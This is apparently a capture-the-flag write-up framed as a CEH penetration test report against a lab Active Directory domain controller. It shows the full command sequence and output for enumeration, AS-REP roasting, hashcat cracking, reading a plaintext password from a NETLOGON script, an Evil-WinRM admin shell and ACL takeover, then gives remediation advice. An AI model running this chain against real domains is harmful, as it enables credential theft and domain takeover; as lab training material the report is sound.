# CEH Penetration Test Report — VulnNet-RST (Active Directory)

## Executive Summary

A targeted assessment of host **10.10.56.127** (AD domain controller for `vulnnet-rst.local`) revealed multiple weaknesses enabling domain compromise. Anonymous/low-auth SMB access exposed shares; AS-REP roasting of a user (`t-skid`) yielded credentials, which in turn exposed NETLOGON scripts containing another user’s plaintext password (`a-whitehat`). That user is a **Domain Admin**, allowing full administrative access. Administrative file access was finalized using Windows ownership/ACL modification.

---

## 0. Scope & Target

* **Target host/IP:** 10.10.56.127
* **Environment:** Microsoft Active Directory Domain Controller
* **Domain:** `VULNNET-RST.LOCAL`
* **Engagement Type:** Intrusive, credential extraction permitted

---

## 1. Reconnaissance

### Objective

Identify exposed services and high-value AD endpoints.

### Action & Findings (Nmap)

```bash
nmap -sV -sC -Pn -T4 10.10.56.127
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-27 11:28 EEST
Nmap scan report for 10.10.56.127
Host is up (0.059s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-27 08:28:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -2s
| smb2-time: 
|   date: 2025-09-27T08:28:33
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

**Impact:** Classic AD/DC surface (Kerberos/LDAP/SMB/RPC). SMB signing enforced; however, subsequent steps show risky share exposure and credential hygiene issues.

---

## 2. Scanning & Enumeration

### SMB / Domain Enumeration (enum4linux)

Attempted with guest context to identify domain, shares, and accessible paths.

```bash
enum4linux -u vulnnet-rst.local\\guest -a 10.10.56.127
...
[+] Server 10.10.56.127 allows sessions using username 'vulnnet-rst.local\guest', password ''

Domain Name: VULNNET-RST
Domain Sid: S-1-5-21-1589833671-435344116-4136949213

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 
VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
...
//10.10.56.127/VulnNet-Business-Anonymous  Mapping: OK Listing: OK
//10.10.56.127/VulnNet-Enterprise-Anonymous Mapping: OK Listing: OK
```

**Impact:** Guest sessions permitted; multiple shares visible including **NETLOGON** and **SYSVOL** (high-value for script/policy loot).

### RID/User Enumeration (Impacket lookupsid)

```bash
python3 lookupsid.py vulnnet-rst.local/guest@10.10.56.127
...
Domain SID is: S-1-5-21-1589833671-435344116-4136949213
...
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

**Impact:** Enumerated valid usernames for subsequent Kerberos attacks.

---

## 3. Gaining Access (Initial Foothold)

### AS-REP Roasting (Impacket GetNPUsers.py)

Selected likely users and attempted AS-REP roast to obtain crackable hashes (no pre-auth).

```bash
python3 GetNPUsers.py vulnnet-rst.local/ -usersfile ../../../vulnnet/users.txt 
...
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:7658a5cb8e2278fe0fae10627c374316$5f263f3207ebb7b8...
```

**Hash Cracking (hashcat)**
Reference mode: **18200 (Kerberos 5, etype 23, AS-REP)** — docs:
[https://hashcat.net/wiki/doku.php?id=example_hashes#:~:text=Kerberos%205%2C%20etype%2023%2C%20AS%2DREP](https://hashcat.net/wiki/doku.php?id=example_hashes#:~:text=Kerberos%205%2C%20etype%2023%2C%20AS%2DREP)

```bash
hashcat -m 18200 hash.txt ../rockyou.txt 
...
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
...
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:...:tj0******
```

**Result:** Recovered password for **t-skid** (`tj0******`).

---

## 4. Lateral Movement & Privilege Escalation

### SMB Share Access with Recovered Creds

```bash
smbclient -L vulnnet-rst.local --user t-skid
...
smbclient \\\\10.10.56.127\\NETLOGON -U vulnnet-rst.local\\t-skid
Password for [VULNNET-RST.LOCAL\t-skid]:
...
  ResetPassword.vbs                   A     2821  Wed Mar 17 01:18:14 2021

smb: \> get ResetPassword.vbs
```

**Found plaintext credentials in logon script:**

```bash
strUserNTName = "a-whitehat"
strPassword = "bNdKVkj******"
```

**Impact:** Credential leakage via NETLOGON script. The user identified below is **Domain Admin**.

### Domain Admin Session (Evil-WinRM)

```bash
vil-winrm -i 10.10.56.127 -u a-whitehat -p bNdKV********
Evil-WinRM shell v3.7
...
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> Get-ADUser $env:username -Properties MemberOf
...
MemberOf          : {CN=Domain Admins,CN=Users,DC=vulnnet-rst,DC=local}
```

**User flag**

```powershell
Get-ChildItem -Path C:\Users -Include *user.txt* -Recurse | Get-Content
THM{726b7c0baaac14*******************}
```

### Administrative File Access (ACL Abuse)

Attempt to read `system.txt` on Administrator desktop initially denied:

```powershell
:\Users\Administrator\Desktop> more system.txt
Access to the path 'C:\Users\Administrator\Desktop\system.txt' is denied.
```

Check ACLs:

```powershell
icacls "C:\Users\Administrator\Desktop\system.txt"
C:\Users\Administrator\Desktop\system.txt NT AUTHORITY\SYSTEM:(F)
                                          VULNNET-RST\Administrator:(F)
```

As **Domain Admin**, take ownership and grant full control:

```powershell
takeown /F "C:\Users\Administrator\Desktop\system.txt"
whoami
vulnnet-rst\a-whitehat
icacls "C:\Users\Administrator\Desktop\system.txt" /grant a-whitehat:F
more system.txt
THM{16f45e3934293a576******************}
```

**Result:** Full administrative access to sensitive files without dumping hashes or using more invasive techniques.

---

## 5. Maintaining Access

* With **Domain Admin** privileges, long-term persistence could be established via:

  * Additional domain admin user creation (not performed).
  * GPO-based startup scripts or scheduled tasks (not performed).
  * Credential vaulting for later re-use (not performed).

(*No persistence mechanisms were deployed in this controlled engagement.*)

---

## 6. Covering Tracks

* No log modification was performed.
* Real-world attackers would clear or alter:

  * **Windows Event Logs** (Security, System, PowerShell/Operational),
  * **SMB/Netlogon logs**, and
  * Potential **Kerberos** authentication traces.

---

## 7. Indicators of Compromise (Artifacts)

* **Hashes/Passwords Recovered:**

  * AS-REP hash for `t-skid` (cracked): `tj0******`
* **Files Retrieved:**

  * `\\10.10.56.127\NETLOGON\ResetPassword.vbs`
* **Flags (redacted):**

  * `THM{726b7c0baaac14*******************}`
  * `THM{16f45e3934293a576******************}`

---

## 8. Remediation & Hardening Recommendations

1. **Eliminate AS-REP Roasting Exposure**

   * Ensure **pre-authentication is required** for all users (disable `DONT_REQ_PREAUTH`).
   * Enforce strong, unique passwords and length (≥14 chars, passphrases).
   * Implement **account lockout** and **MFA** where applicable.

2. **Secure NETLOGON/SYSVOL**

   * Remove plaintext passwords from **logon scripts**.
   * Review all GPO/NETLOGON scripts for secrets; migrate secrets to secure vaults (e.g., **LAPS** for local admin, **gMSA** for services).

3. **Reduce Anonymous/Low-Auth Exposure**

   * Disable guest/anonymous SMB sessions; require authentication for share enumeration.
   * Limit share visibility and enforce **least privilege** ACLs on **NETLOGON** and **SYSVOL** content.

4. **Monitoring & Detection**

   * Alert on **AS-REQ without pre-auth** events.
   * Audit **PowerShell** activity (Module, ScriptBlock Logging), and **Event ID 4624/4625**, **4768/4769/4771** (Kerberos), **5140/5145** (SMB).

5. **Password Policy & Credential Hygiene**

   * Length-first policy; ban common passwords (rockyou-based).
   * Regular **Kerberoasting** and **AS-REP roast** detection scans internally (blue team).

6. **Administrative Tiering**

   * Use **Privileged Access Workstations** for DA actions.
   * Avoid interactive logon of DA accounts on member servers/workstations.

---

## 9. Tools Referenced

* **Nmap:** Service discovery — [https://nmap.org/](https://nmap.org/)
* **enum4linux:** SMB/NetBIOS enumeration — [https://labs.portcullis.co.uk/tools/enum4linux/](https://labs.portcullis.co.uk/tools/enum4linux/)
* **Impacket (lookupsid.py, GetNPUsers.py):** AD/Kerberos tooling — [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
* **hashcat:** Hash cracking (mode 18200) — [https://hashcat.net/wiki/doku.php?id=example_hashes#:~:text=Kerberos%205%2C%20etype%2023%2C%20AS%2DREP](https://hashcat.net/wiki/doku.php?id=example_hashes#:~:text=Kerberos%205%2C%20etype%2023%2C%20AS%2DREP)
* **smbclient:** SMB interaction — part of Samba suite
* **Evil-WinRM:** WinRM shell for pentesting — [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

---

## 10. Raw Command/Output Appendix (Preserved)

### Nmap

```bash
nmap -sV -sC -Pn -T4 10.10.56.127
... (full output exactly as above) ...
```

### enum4linux

```bash
enum4linux -u vulnnet-rst.local\\guest -a 10.10.56.127
... (full output exactly as above) ...
```

### lookupsid.py (Impacket)

```bash
python3 lookupsid.py vulnnet-rst.local/guest@10.10.56.127
... (full output exactly as above) ...
```

### GetNPUsers.py (Impacket)

```bash
python3 GetNPUsers.py vulnnet-rst.local/ -usersfile ../../../vulnnet/users.txt 
... (full output exactly as above) ...
```

### hashcat (mode 18200)

```bash
hashcat -m 18200 hash.txt ../rockyou.txt 
... (full output exactly as above) ...
```

### smbclient & file retrieval

```bash
smbclient -L vulnnet-rst.local --user t-skid
smbclient \\\\10.10.56.127\\NETLOGON -U vulnnet-rst.local\\t-skid
... get ResetPassword.vbs ...
```

**Recovered from NETLOGON script (as found):**

```bash
strUserNTName = "a-whitehat"
strPassword = "bNdKVkj******"
```

### Evil-WinRM session and ACL abuse

```powershell
vil-winrm -i 10.10.56.127 -u a-whitehat -p bNdKV********
Get-ADUser $env:username -Properties MemberOf
Get-ChildItem -Path C:\Users -Include *user.txt* -Recurse | Get-Content
more system.txt  # initially denied
icacls "C:\Users\Administrator\Desktop\system.txt"
takeown /F "C:\Users\Administrator\Desktop\system.txt"
icacls "C:\Users\Administrator\Desktop\system.txt" /grant a-whitehat:F
more system.txt
```

---

### Conclusion

Compromise was achieved via **AS-REP roasting** and **credential leakage in NETLOGON scripts**, culminating in **Domain Admin** control. Remediations above should be prioritized to reduce risk of repeat compromise.
